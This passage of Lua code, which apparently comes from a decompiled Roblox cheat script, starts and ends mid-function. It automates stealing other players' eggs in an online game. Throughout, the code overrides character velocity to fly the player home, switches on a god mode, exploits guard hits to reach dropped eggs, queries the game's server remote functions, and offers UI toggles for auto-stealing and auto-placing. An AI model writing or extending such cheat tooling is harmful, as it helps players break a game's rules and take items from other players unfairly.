								local n23 = n21 < 0.6 and math.clamp(n22 / math.max(0.6 - n21, 0.1), -120, 120) or math.clamp(n22 / 0.2, -30, 30)

								pcall(function()
									v20.AssemblyLinearVelocity = Vector3.new(0, n23, 0)
								end)
							end

							n21 += RunService.Heartbeat:Wait()
						end

						local ok, result = pcall(tbl4.Steal.HeldByMe)

						if ok and not result then
							tbl4.Steal.Carrying = false
						else
							tbl4.SafeCarry.SlowUntil = os.clock() + 2
						end
					end
				end

				local n18 = 0

				while not tbl4.Steal.Carrying and n18 < n11 and not fn13(arg) do
					str2 = "Checking the egg in hand"
					n18 += RunService.Heartbeat:Wait()
				end

				if not tbl4.Steal.Carrying then
					str2 = "The egg is gone, staying to look for it"
					if not fn50(arg) then
						str2 = "The egg is gone"
						return false
					end
				end

				if tbl4.SafeCarry.Enabled then
					return tbl4.SafeCarry.Home(arg)
				end
				local v19 = stealHome()
				local v20 = tbl4.Root()
				if not v19 or not v20 then
					return false
				end
				local n19 = math.max(v20.Position.Y, v19.Y) + n4

				local function fn55()
					if tbl20.Uid and tbl20.Freed and tbl4.Steal.Carrying then
						return "priority"
					end
					return nil
				end

				local flag3 = true
				local n20 = 0

				while true do
					local v21 = tbl4.Root()

					if not v21 then
						return false
					else
						str2 = "Flying home"
						local position = v21.Position
						local n21 = math.max(n19, position.Y)
						local v22, v23 = fn35(Vector3.new(position.X + (v19.X - position.X) * 0.25, position.Y + (n21 - position.Y) * 0.7, position.Z + (v19.Z - position.Z) * 0.25), arg, flag3, nil, nil, fn55)

						if v22 then
							v22, v23 = fn35(Vector3.new(v19.X, n21, v19.Z), arg, flag3, nil, nil, fn55)
						end

						if v22 then
							v22, v23 = fn35(v19, arg, flag3, nil, nil, fn55)
						end

						if v22 then
							local character = localPlayer.Character
							character = character and character:FindFirstChildOfClass("Humanoid")

							if character then
								character.PlatformStand = false
							end

							task.wait(0.2)
							if not tbl4.Steal.Carrying then
								str2 = "Arrived without the egg"
								return false
							end
							local eggState = tbl.EggState

							if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
								pcall(eggState.DropFieldEgg, "PlayerRequest")
							end

							return true
						end

						if v23 == "priority" then
							local uid2 = tbl20.Uid
							local freed = tbl20.Freed
							local v24 = tbl20
							tbl20.Uid = nil
							v24.Freed = nil
							local v25 = tbl4.Root()
							if not v25 or not uid2 or not freed then
								return false
							end

							if (freed - v25.Position).Magnitude <= n5 * n17 then
								str2 = "Best egg fell nearby, swapping eggs"
								local eggState = tbl.EggState

								if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
									pcall(eggState.DropFieldEgg, "PlayerRequest")
								end

								local n22 = 0

								while tbl4.Steal.Carrying and n22 < 1 do
									n22 += RunService.Heartbeat:Wait()
								end

								if not fn50(arg, uid2) then
									return false
								end
							else
								str2 = "Best egg fell far away, riding a guard hit to it"
								if not fn53(arg, uid2, freed) then
									return false
								end
							end

							local v26 = tbl4.Root()
							n20 = 0

							if v26 then
								n19 = math.max(v26.Position.Y, v19.Y) + n4
							end

							continue
						end

						if v23 == "dropped" and n20 < huge then
							n20 += 1
							if not fn50(arg) then
								return false
							end
							continue
						end

						break
					end
				end

				return false
			end

			local function fn55(arg)
				local n18 = tonumber(arg) or 0
				local tbl21 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n19 = 1

				while math.abs(n18) >= 1000 and n19 < #tbl21 do
					n18 /= 1000
					n19 += 1
				end

				return string.format(n19 == 1 and "%.0f%s" or "%.2f%s", n18, tbl21[n19])
			end

			local function fn56(arg)
				if not arg then
					return "None"
				end
				local format = string.format
				local str3 = tostring(arg.Category)
				local n18 = tonumber(arg.Scale) or 0
				local v19 = tostring
				local areaId = arg.AreaId
				local v20 = format("%s  %.2fx  |  value %s  |  %s", str3, n18, fn55(arg.Value), v19(areaId))

				if arg.State == "Dropped" then
					v20 ..= "  |  dropped"
				elseif arg.State == "Carried" then
					v20 ..= "  |  carried by a player"
				end

				return v20
			end

			local flag3 = false
			local n18 = 0.5
			local n19 = 0.6
			local n20 = 0
			local n21 = 0

			local function fn57()
				local v19 = n6
				tbl4.Steal.Active = true
				tbl4.Steal.Carrying = tbl4.Steal.Carrying == true

				if not tbl4.Steal.Carrying then
					tbl4.Steal.CarryUid = nil
				end

				local v20 = fn19(false, true)
				local v21 = nil
				local v22 = nil
				local lastSkip = nil

				for _, v23 in ipairs(v20) do
					if v23.State == "Carried" then
						v22 = v22 or v23
					else
						local v24 = tbl4.SafeCarry.Unsafe(v23)

						if v24 then
							lastSkip = lastSkip or v24
						else
							v21 = v23
							break
						end
					end
				end

				local tbl21 = { v21 }
				uid = v21 and v21.Uid or nil
				tbl4.Steal.Wanted = v21 ~= nil
				str = fn56(v21)

				if v22 then
					str ..= "  |  watching " .. tostring(v22.Category)
				end

				if not v21 then
					tbl4.Steal.Active = false
					lastSkip = lastSkip or tbl4.SafeCarry.LastSkip
					tbl4.SafeCarry.LastSkip = nil
					str2 = v22 and "Best egg is carried, waiting for it" or lastSkip and "Skipped: " .. lastSkip or "No egg matches"
					return false
				end

				if not tbl4.ClaimMovement("steal") then
					tbl4.Steal.Active = false
					str2 = "Waiting for Auto Place"
					return false
				end

				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					tbl4.ExitBelt()
				end

				flag3 = true
				tbl4.HoldBelt()

				local function fn58(arg)
					str2 = arg
					local v23 = fn51(v21, v19)
					local flag4 = false
					local v24 = nil

					if v23 then
						if fn29(v21.Uid, v19) then
							flag4 = fn54(v19)
							v24 = nil
						else
							v24 = str2
						end
					end

					fn25()
					tbl4.Steal.Active = false
					tbl4.Steal.LastFinishedAt = os.clock()
					str2 = flag4 and "Delivered" or v24 or v23 and "Run ended" or "That egg would not come free"
					return true
				end

				local v23 = tbl4.Root()
				local position = typeof(v21.CFrame) == "CFrame" and v21.CFrame.Position or nil

				if v23 and position then
					local flag4 = (position - v23.Position).Magnitude <= n16
					local areaId = v21.AreaId
					local flag5 = localPlayer:GetAttribute("AreaId") == areaId
					if flag4 or flag5 then
						return (fn58("Target is right here, taking it"))
					end
				end

				if tbl4.SafeCarry.Enabled and tbl4.SafeCarry.Approach == "Run" then
					local v24 = tbl4.SafeCarry.RunTo(v21, v19)
					local flag4, v25

					if v24 then
						if fn29(v21.Uid, v19) then
							flag4 = fn54(v19)
							v25 = nil
						else
							flag4 = false
							v25 = str2
						end
					else
						tbl18[v21.Uid] = os.clock() + n7
						flag4 = false
						v25 = nil
					end

					fn25()
					tbl4.Steal.Active = false
					tbl4.Steal.LastFinishedAt = os.clock()
					str2 = flag4 and "Delivered" or v25 or v24 and "Run ended" or "That egg would not come free"
					return true
				end

				local v24 = fn19(true)
				local str3 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local tbl22 = {}

				for _, v25 in ipairs(v24) do
					local v26 = fn36(v25)
					local flag4

					if v26 then
						flag4 = v26
					else
						flag4 = type(v25.Uid) == "string" and string.sub(v25.Uid, 1, #str3) == str3
					end

					if flag4 then
						table.insert(tbl22, v25)
					end
				end

				if #tbl22 ~= 0 then
					v24 = tbl22
				end

				local v25, v26 = fn33(v24)

				if not v25 then
					tbl4.Steal.Active = false
					str2 = "No egg matches"
					return false
				end

				if v25.Uid == v21.Uid then
					return (fn58("Target is the closest egg, taking it"))
				end
				local v27, v28 = fn37(v25)
				local v29

				if v28 and v23 then
					local v30, v31, v32 = ipairs(v24)
					local huge3 = math.huge
					local v33 = v25

					for _, v34 in v30, v31, v32 do
						local position2 = typeof(v34.CFrame) == "CFrame" and v34.CFrame.Position or nil

						if v34.Uid ~= v21.Uid and v34.AreaId == v25.AreaId and position2 then
							local magnitude = (position2 - v23.Position).Magnitude

							if n13 < (position2 - v28).Magnitude then
								magnitude += n13
							end

							if magnitude < huge3 then
								huge3 = magnitude
								v33 = v34
							end
						end
					end

					v29 = v33
				else
					v29 = v25
				end

				str2 = string.format("Sleeping guard egg %d studs away", math.floor(v26 + 0.5))

				if not v29 then
					tbl4.Steal.Active = false
					str2 = "No egg matches"
					return false
				end

				local v30, v31 = fn45(v29, v19, false, tbl21[1])
				if not v30 then
					tbl4.Steal.Active = false
					return false
				end
				local uid2 = nil
				local uid3 = v21.Uid
				local n22 = 0

				while true do
					if v31 and not fn13(v19) then
						str2 = "Holding for the guard hit"

						if fn38(v19, v31, function(arg)
							if not uid2 and tbl20.Uid and tbl20.Freed then
								uid2 = tbl20.Uid
								arg.Destination = tbl20.Freed + Vector3.new(0, 3, 0)
								local v32 = tbl20
								tbl20.Uid = nil
								v32.Freed = nil
								str2 = "Best egg fell, jumping to it instead"
							end
						end) then
							n22 += 1

							if uid2 then
								uid3 = uid2
								fn50(v19, uid2)
								break
							else
								local v32 = tbl21[n22]
								local v33
								v33, v31 = fn45(v32, v19, true, tbl21[n22 + 1])

								if v33 then
									if v32 and type(v32.Uid) == "string" then
										uid3 = v32.Uid
									end

									continue
								end
							end
						end
					end

					break
				end

				if not fn29(uid3, v19) then
					local v32 = str2
					fn25()
					tbl4.Steal.Active = false
					tbl4.Steal.LastFinishedAt = os.clock()
					str2 = v32
					return true
				end

				local v32 = fn54(v19)
				fn25()
				tbl4.Steal.Active = false
				tbl4.Steal.LastFinishedAt = os.clock()
				str2 = v32 and "Delivered" or "Run ended"
				return true
			end

			local eggState = tbl.EggState

			if type(eggState) == "table" then
				for _, v19 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "SnapshotRefreshed" }) do
					local v20 = eggState[v19]

					if type(v20) == "table" and type(v20.Connect) == "function" then
						local ok, result = pcall(v20.Connect, v20, function()
							tbl3.Wake()
						end)

						if ok and result then
							fn4(function()
								pcall(function()
									result:Disconnect()
								end)
							end)
						end
					end
				end
			end

			tbl3.Add(function()
				local flag4 = nil

				if v15 then
					flag4 = type(v15.Set) == "function"
				end

				if flag4 then
					pcall(v15.Set, nil, str2)
				end

				local flag5 = nil

				if v16 then
					flag5 = type(v16.Set) == "function"
				end

				if flag5 then
					pcall(v16.Set, nil, str)
				end

				if not tbl4.Toggle(v14, false) then
					return false
				end
				local v19, v20, v21 = fn14()

				if v19 then
					if v20 == "night" then
						fn16()
					end

					tbl4.Movement.StealFirst = true
					tbl4.Steal.Wanted = false

					if flag2 then
						n6 += 1
						tbl4.Steal.Active = false
						fn25()
						tbl4.StopWalking()
					end

					local n22 = math.max(0, math.ceil(v19 - v21))

					if v20 == "wall" then
						str2 = string.format("Field wall up, %ds", n22)
					else
						str2 = string.format("Night, going again in %ds", n22)
					end

					return false
				end

				if v17 and n9 == math.huge then
					n9 = os.clock() + n8
				end

				if flag2 then
					return true
				end

				if fn17() then
					str2 = "Night over, waiting for the field to reset"
					tbl3.Wake()
					return false
				end

				local stealFirst = tbl4.Movement.StealFirst
				local owner = tbl4.Movement.Owner
				local flag6 = tbl4.Movement.PlaceWanted and not stealFirst
				local flag7

				if flag6 then
					flag7 = flag6
				else
					flag7 = owner ~= nil and owner ~= "steal" and owner ~= "treadmill" and owner ~= "scramble"
				end

				if flag7 then
					if os.clock() >= n20 then
						n20 = os.clock() + n18
						local ok, result = pcall(fn19, false, false)
						ok = ok and type(result) == "table" and result[1] ~= nil
						tbl4.Steal.Wanted = ok

						if ok then
							tbl4.Movement.StealFirst = true
						end
					end

					if tbl4.Steal.Wanted then
						local v22 = tostring
						owner = owner or "Auto Place"
						str2 = "Egg found, waiting for " .. v22(owner) .. " to stop"
					else
						str2 = "Waiting for " .. tostring(owner or "Auto Place")
					end

					return true
				end

				if os.clock() < n21 then
					return true
				end
				tbl4.Movement.StealFirst = false
				flag2 = true

				task.spawn(function()
					local ok = pcall(fn57)

					if flag3 then
						flag3 = false
						tbl4.ReleaseBelt()
					end

					if not ok then
						fn25()
						tbl4.Steal.Active = false
					end

					local v22 = uid
					uid = nil
					local v23 = v22 and tbl14[v22]

					if v23 and v23.Once then
						tbl14[v22] = nil
					end

					local v24 = tbl20
					local v25 = tbl20
					tbl20.Uid = nil
					v24.Freed = nil
					v25.Token = nil

					if str2 == "Delivered" and not tbl4.IsNight() then
						tbl4.Movement.StealFirst = true
					end

					if not tbl4.Steal.Wanted then
						n21 = os.clock() + n19
					end

					tbl4.ReleaseMovement("steal")
					flag2 = false
					tbl3.Wake()
				end)

				return true
			end)
		end

		v14 = v5

		fn12 = function()
			n6 += 1
			table.clear(tbl18)
			tbl4.Steal.Active = false
			tbl4.Steal.Wanted = false
			local v19 = tbl4.Toggle(v14, false)
			tbl4.Shield("steal", v19)

			if not v19 then
				tbl4.Movement.StealFirst = false
				table.clear(tbl14)
				table.clear(tbl15)
				table.clear(tbl16)
			end

			fn25()
			tbl4.StopWalking()
			tbl3.Wake()
		end

		do
			local function fn39()
				n6 += 1
				tbl4.Steal.Active = false
				fn25()
				tbl4.StopWalking()
			end

			local function fn40()
				if tbl4.Toggle(v14, false) then
					return true
				end

				if v14 and type(v14.Set) == "function" then
					pcall(v14.Set, v14, true)
				end

				return false
			end

			tbl4.CancelSteal = function(arg)
				if type(arg) ~= "string" then
					return
				end
				tbl14[arg] = nil
				tbl15[arg] = nil
				tbl16[arg] = true

				if flag2 and uid == arg then
					fn39()
				end

				tbl3.Wake()
			end

			tbl4.StealQueue = function()
				local tbl19 = {}

				for k in pairs(tbl14) do
					table.insert(tbl19, k)
				end

				table.sort(tbl19, function(arg, arg2)
					local at = tbl14[arg].At
					local at2 = tbl14[arg2].At
					if at ~= at2 then
						return at < at2
					end
					return arg < arg2
				end)

				return tbl19
			end

			tbl4.PrioritizeSteal = function(arg)
				if type(arg) ~= "string" or fn15() then
					return
				end
				local n14 = 0

				for _, v19 in pairs(tbl14) do
					if v19.At < n14 then
						n14 = v19.At
					end
				end

				tbl14[arg] = { At = n14 - 1, Once = false }
				tbl16[arg] = nil
				tbl18[arg] = nil

				if fn40() and flag2 and not tbl4.Steal.Carrying and uid ~= arg then
					fn39()
				end

				tbl3.Wake()
			end

			tbl4.MoveInPlan = function(arg, arg2)
				local flag3 = type(arg) ~= "string"
				local flag4

				if flag3 then
					flag4 = flag3
				else
					flag4 = arg2 ~= -1 and arg2 ~= 1
				end

				if flag4 or fn15() then
					return
				end
				local v19 = tbl4.StealPlan()
				local v20 = table.find(v19, arg)
				local n14 = v20 and v20 + arg2
				if not n14 or n14 < 1 or n14 > #v19 then
					return
				end
				table.remove(v19, v20)
				table.insert(v19, n14, arg)
				local n15 = math.max(v20, n14)

				for i, v21 in ipairs(v19) do
					if i <= n15 or tbl14[v21] then
						local v22 = tbl14[v21]

						if v22 then
							v22.At = i
						else
							tbl14[v21] = { At = i, Once = false }
						end

						tbl16[v21] = nil
					end
				end

				if flag2 and not tbl4.Steal.Carrying and uid and v19[1] ~= uid then
					fn39()
				end

				tbl3.Wake()
			end

			tbl4.StealPlan = function()
				if not tbl4.Toggle(v14, false) or tbl4.IsNight() then
					return {}, nil
				end
				local tbl19 = {}

				if uid then
					table.insert(tbl19, uid)
				end

				local ok, result = pcall(fn19, false, true)

				if ok and type(result) == "table" then
					for _, v19 in ipairs(result) do
						if v19.Uid ~= uid then
							table.insert(tbl19, v19.Uid)
						end
					end
				end

				return tbl19, uid
			end

			tbl4.SetPriority = function(arg, arg2)
				if arg2 then
					tbl4.PrioritizeSteal(arg)
				else
					tbl4.CancelSteal(arg)
				end
			end

			tbl4.ResortSteal = function()
				if flag2 and not tbl4.Steal.Carrying and uid and not tbl14[uid] then
					local ok, result = pcall(fn19, false, true)

					if ok and type(result) == "table" then
						local v19 = nil

						for _, v20 in ipairs(result) do
							if v20.State ~= "Carried" then
								v19 = v20
								break
							else
								v19 = nil
							end
						end

						if not v19 or v19.Uid ~= uid then
							fn39()
						end
					end
				end

				tbl3.Wake()
			end

			tbl4.StealNow = function(arg, arg2)
				if type(arg) ~= "string" or fn15() then
					return
				end

				if not tbl14[arg] then
					local n14 = 0

					for _, v19 in pairs(tbl14) do
						if v19.At > n14 then
							n14 = v19.At
						end
					end

					tbl14[arg] = { At = n14 + 1, Once = arg2 == true }
				end

				tbl16[arg] = nil
				tbl18[arg] = nil
				local flag3 = fn40() and flag2 and not tbl4.Steal.Carrying and uid ~= arg

				if flag3 then
					flag3 = not (uid and tbl14[uid])
				end

				if flag3 then
					fn39()
				end

				tbl3.Wake()
			end
		end

		fn4(function()
			tbl4.GodMode(false)
			tbl4.ReleaseMovement("steal")
			fn25()
		end)

		tbl4.UiQueue = {}

		tbl4.UiDefer = function(arg)
			table.insert(tbl4.UiQueue, arg)
		end

		tbl4.Notify = function(arg, arg2)
			if type(v) == "table" and type(v.Notify) == "function" then
				pcall(v.Notify, arg, arg2, 5)
			end
		end

		local connection = RunService.Heartbeat:Connect(function()
			local uiQueue = tbl4.UiQueue
			if #uiQueue == 0 then
				return
			end
			tbl4.UiQueue = {}

			for _, v19 in ipairs(uiQueue) do
				pcall(v19)
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		tbl4.Rift = { Requirements = {}, At = 0, Busy = false, Next = 0, Handles = {}, Restart = {} }

		tbl4.RiftOn = function(arg)
			local v19 = tbl4.Rift.Handles[arg]
			return v19 ~= nil and tbl4.Toggle(v19, false) == true
		end

		do
			local n14 = 8

			local function fn39(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
				return type(flag3) == "table" and flag3 or nil
			end

			tbl4.EggRarity = function(arg)
				local v19 = fn39(arg.AssetCategory)
				local rarity = v19 and v19.Rarity or nil
				local flag3 = type(rarity) == "table"

				if flag3 then
					flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag3 or 0
			end

			tbl4.EggIncome = function(arg)
				local n15 = fn39(arg.AssetCategory)
				n15 = n15 and tonumber(n15.EarningRate) or 0
				local n16 = tonumber(arg.AssetScale) or 0
				if n16 <= 0 then
					return 0
				end
				local n17 = n16 > 5 and (n16 / 5) ^ 1.2 * 19.637875755794113 or n16 ^ 1.85
				local mutations = tbl.Mutations
				local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n18 = 1

				if flag3 then
					local ok
					ok, n18 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n18) == "number"
					local n19 = 1

					if not ok then
						n18 = n19
					end
				end

				return n15 * n17 * n18
			end

			tbl4.RiftShortfall = function()
				local tbl19 = {}

				for _, requirement in ipairs(tbl4.Rift.Requirements) do
					tbl19[requirement] = (tbl19[requirement] or 0) + 1
				end

				if next(tbl19) == nil then
					return tbl19
				end
				local save2 = tbl.Save
				local flag3 = type(save2) == "table" and type(save2.Get) == "function"
				local result = nil

				if flag3 then
					local ok
					ok, result = pcall(save2.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return {}
				end
				local tbl20 = {}
				local v19 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in v19(equippedAssets) do
					tbl20[equippedAsset] = true
				end

				local v20 = pairs
				local inventory = result.Inventory or {}

				for k, v21 in v20(inventory) do
					local str3 = type(v21) == "table" and tostring(v21.Category) or nil
					local flag4

					if str3 then
						flag4 = (tbl19[str3] or 0) > 0
					else
						flag4 = str3
					end

					flag4 = flag4 and v21.InFuse ~= true

					if flag4 and v21.IsFavorite ~= true and not tbl20[k] then
						tbl19[str3] = tbl19[str3] - 1
					end
				end

				for k, v21 in pairs(tbl19) do
					if v21 <= 0 then
						tbl19[k] = nil
					end
				end

				return tbl19
			end

			local function fn40()
				for k in pairs(tbl4.Rift.Handles) do
					if tbl4.RiftOn(k) then
						return true
					end
				end

				return false
			end

			tbl3.Add(function()
				local rift = tbl4.Rift
				local busy = rift.Busy
				local flag3

				if busy then
					flag3 = busy
				else
					local next_ = rift.Next
					flag3 = os.clock() < next_
				end

				if flag3 or not fn40() then
					return false
				end
				rift.Busy = true
				rift.Next = os.clock() + n14

				task.spawn(function()
					local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")

					if rfRiftAskState and rfRiftAskState:IsA("RemoteFunction") then
						local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)

						if ok and type(result) == "table" then
							local requirements = {}

							if result.Unlocked == true and type(result.Requirements) == "table" then
								for _, requirement in ipairs(result.Requirements) do
									table.insert(requirements, tostring(requirement))
								end
							end

							rift.Requirements = requirements
							rift.At = os.clock()
						end
					end

					rift.Busy = false
					tbl3.Wake()
				end)

				return false
			end)
		end

		local tbl19
		tbl19 = { "Always", "Steal Idle", "After Steal", "Night Only" }
		local tbl20
		tbl20 = { "Biggest Size", "Highest Value", "Smallest Size", "Backpack Order" }
		local v19
		v19 = tbl19[1]
		local v20
		v20 = tbl20[2]
		local tbl21
		tbl21 = {}
		local tbl22
		tbl22 = {}
		local n14
		n14 = 0

		do
			local function fn39()
				if type(tbl4.PlaceEggRefresh) == "function" then
					tbl4.PlaceEggRefresh()
				end
			end

			local function fn40(arg)
				local tbl23 = {}

				if type(arg) == "table" then
					for k, v21 in pairs(arg) do
						k = v21 == true and type(k) == "string" and k or type(v21) == "string" and v21
						local v22 = k or nil

						if v22 then
							table.insert(tbl23, v22)
						end
					end
				end

				return tbl23
			end

			tbl4.PlaceEggStatusRow = v9:CreateText({ Name = "Pen Status", Text = "Pen status unknown" })

			tbl4.PlaceEggHandle = v9:CreateToggle({
				Name = "Auto Place Egg",
				Default = false,
				Callback = function()
					if type(tbl4.PlaceEggRestart) == "function" then
						tbl4.PlaceEggRestart()
					end
				end,
			})

			local placeEggHandle = tbl4.PlaceEggHandle

			v9:CreateDropdown({
				Name = "Place Egg Rule",
				Options = tbl19,
				Default = tbl19[1],
				SubOf = placeEggHandle,
				Callback = function(arg)
					if table.find(tbl19, arg) then
						v19 = arg
					end
				end,
			})

			v9:CreateDropdown({
				Name = "Place Egg Order",
				Options = tbl20,
				Default = tbl20[2],
				SubOf = placeEggHandle,
				Callback = function(arg)
					if table.find(tbl20, arg) then
						v20 = arg
					end
				end,
			})

			local tbl23 = {}

			for i = 2, #tbl8 do
				table.insert(tbl23, tbl8[i])
			end

			if #tbl23 > 0 then
				fn6(v9:CreateMultiDropdown({
					Name = "Place Rarities",
					Note = "Only place eggs of the picked rarities (empty = all)",
					Options = tbl23,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(arg)
						local tbl24 = {}

						for _, v21 in ipairs(fn40(arg)) do
							local v22 = tbl9[v21]

							if v22 and v22 > 0 then
								tbl24[v22] = true
							end
						end

						tbl21 = tbl24
						fn39()
					end,
				}))
			end

			local tbl24 = {}
			local tbl25 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl26 = {}

			if type(directory) == "table" then
				for k, v21 in pairs(directory) do
					local rarity = type(v21) == "table" and v21.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						table.insert(tbl26, {
							Category = tostring(k),
							Name = tostring(v21.DisplayName or k),
							Rarity = flag3,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag3),
						})
					end
				end
			end

			table.sort(tbl26, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v21 in ipairs(tbl26) do
				local str3 = string.format("%s [%s]", v21.Name, v21.RarityName)

				if tbl25[str3] then
					str3 = string.format("%s [%s] (%s)", v21.Name, v21.RarityName, v21.Category)
				end

				table.insert(tbl24, str3)
				tbl25[str3] = v21.Category
			end

			if #tbl24 > 0 then
				fn6(v9:CreateMultiDropdown({
					Name = "Place Specific Eggs",
					Note = "Only place these eggs (empty = all)",
					Options = tbl24,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(arg)
						local tbl27 = {}

						for _, v21 in ipairs(fn40(arg)) do
							if tbl25[v21] then
								tbl27[tbl25[v21]] = true
							end
						end

						tbl22 = tbl27
						fn39()
					end,
				}))
			end

			local tbl27 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n15 = 0
			local str3 = "M/s"

			local function fn41(arg, arg2)
				if arg ~= nil then
					n15 = math.max(0, math.floor(tonumber(arg) or n15))
				end

				if arg2 ~= nil then
					str3 = tostring(arg2)
				end

				n14 = n15 * (tbl27[str3] or tbl27["M/s"]).Mult
			end

			fn5(v9, {
				Name = "Min Place Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = placeEggHandle,
				Legacy = "Place Min Value",
				SectionName = "Auto Place Egg",
				OnRaw = function(arg)
					fn41(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		local n15

		do
			local n16 = 5
			n15 = 26
			local n17 = 6
			local n18 = 8
			local n19 = 0
			local n20 = 30
			local n21 = 12
			local placeEggHandle = nil
			local placeEggStatusRow = nil
			local str3 = "Pen status unknown"
			local flag3 = false
			local tbl23 = {}
			local n22 = 0
			local v21 = nil
			local n23 = 30

			local function fn39(arg, arg2)
				local v22 = networking:FindFirstChild(arg)
				if not v22 or not v22:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v22.InvokeServer, v22, arg2)
			end

			local function fn40(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag4 = type(directory) == "table" and directory[tostring(arg.AssetCategory)] or nil
				return type(flag4) == "table" and flag4 or nil
			end

			local function fn41(arg)
				local v22 = fn40(arg)
				local rarity = v22 and v22.Rarity or nil
				local flag4 = type(rarity) == "table"

				if flag4 then
					flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag4 or 0
			end

			local function fn42(arg)
				local n24 = fn40(arg)
				n24 = n24 and tonumber(n24.EarningRate) or 0
				local n25 = tonumber(arg.AssetScale) or 0
				if n25 <= 0 then
					return 0
				end
				local n26 = n25 > 5 and (n25 / 5) ^ 1.2 * 19.637875755794113 or n25 ^ 1.85
				local mutations = tbl.Mutations
				local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n27 = 1

				if flag4 then
					local ok
					ok, n27 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n27) == "number"
					local n28 = 1

					if not ok then
						n27 = n28
					end
				end

				return n24 * n26 * n27
			end

			local function fn43()
				local tbl24 = {}
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")
				if not backpack then
					return tbl24
				end
				local n24 = 0

				for _, child in ipairs(backpack:GetChildren()) do
					local attribute = child:GetAttribute("UID")

					if type(attribute) == "string" then
						n24 += 1
						tbl24[attribute] = n24
					end
				end

				return tbl24
			end

			local function fn44()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local v22 = fn43()
				local tbl24 = {}

				if tbl4.RiftOn("Place") then
					tbl24 = tbl4.RiftShortfall()

					for _, v23 in pairs(result) do
						if type(v23) == "table" and v23.Placement ~= nil then
							local str4 = tostring(v23.AssetCategory)

							if (tbl24[str4] or 0) > 0 then
								tbl24[str4] = tbl24[str4] - 1
							end
						end
					end
				end

				local tbl25 = {}

				for k, v23 in pairs(result) do
					if type(v23) == "table" and v23.Placement == nil and not tbl23[k] then
						local v24 = fn42(v23)
						local str4 = tostring(v23.AssetCategory)
						local flag4 = next(tbl21) == nil or tbl21[fn41(v23)] == true
						local flag5 = next(tbl22) == nil or tbl22[str4] == true
						local flag6 = n14 <= 0 or v24 >= n14
						local flag7 = (tbl24[str4] or 0) > 0

						if flag7 then
							tbl24[str4] = tbl24[str4] - 1
						end

						if flag7 or flag4 and flag5 and flag6 then
							table.insert(tbl25, {
								Uid = k,
								Scale = tonumber(v23.AssetScale) or 0,
								Income = v24,
								Slot = v22[k] or math.huge,
								Rift = flag7,
							})
						end
					end
				end

				table.sort(tbl25, function(arg, arg2)
					if arg.Rift ~= arg2.Rift then
						return arg.Rift
					end

					if v20 == tbl20[2] and arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end

					if v20 == tbl20[3] and arg.Scale ~= arg2.Scale then
						return arg.Scale < arg2.Scale
					end

					if v20 == tbl20[4] and arg.Slot ~= arg2.Slot then
						return arg.Slot < arg2.Slot
					end
					return arg.Scale > arg2.Scale
				end)

				return tbl25
			end

			local function fn45(arg)
				if arg == 0 then
					return false
				end
				local steal = tbl4.Steal
				if v19 == tbl19[2] then
					return not steal.Active and not steal.Carrying
				end

				if v19 == tbl19[3] then
					local flag4 = steal.LastFinishedAt > 0

					if flag4 then
						local lastFinishedAt = steal.LastFinishedAt
						flag4 = os.clock() - lastFinishedAt <= n21
					end

					return flag4
				end

				if v19 == tbl19[4] then
					return tbl4.IsNight()
				end
				return true
			end

			local function fn46()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n24 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, v22 in pairs(result) do
							if type(v22) == "table" and v22.Placement ~= nil then
								n24 += 1
							end
						end
					end
				end

				local save2 = tbl.Save
				local flag5 = type(save2) == "table" and type(save2.Get) == "function"
				local result = nil

				if flag5 then
					local ok
					ok, result = pcall(save2.Get)
					result = ok and type(result) == "table" and result or nil
				end

				local flag6 = result and type(result.EquippedAssets) == "table"
				local n25 = 0

				if flag6 then
					for k in pairs(result.EquippedAssets) do
						n25 += 1
					end
				end

				local v22 = fn2(function()
					return ReplicatedStorage.Data.Bases
				end)

